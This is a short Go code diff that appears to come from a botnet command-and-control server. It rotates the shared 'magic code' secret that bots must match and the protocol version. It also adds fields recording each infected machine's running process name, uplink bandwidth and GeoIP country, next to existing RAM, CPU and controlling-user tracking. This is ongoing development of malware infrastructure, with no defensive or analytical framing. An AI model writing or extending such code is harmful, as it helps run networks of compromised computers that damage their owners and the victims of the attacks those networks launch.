@@ -25,8 +25,8 @@ const (
 	USER_SERVER_PORT = "420"
 
 	// Authentication  these must match bot
-	MAGIC_CODE       = "1Kxah27lJg#ptaVo"
-	PROTOCOL_VERSION = "v5.7.19"
+	MAGIC_CODE       = "jDk@5s3qcoo2HvIA"
+	PROTOCOL_VERSION = "v3.4.58"
 )
 
 type BotConnection struct {
@@ -39,6 +39,9 @@ type BotConnection struct {
 	ip            string
 	ram           int64    // RAM in MB
 	cpuCores      int      // CPU cores
+	processName   string   // Running process name
+	uplinkMbps    float64  // Uplink speed in Mbps
+	country       string   // GeoIP country code
 	userConn      net.Conn // Track which user is controlling this bot
 }
 
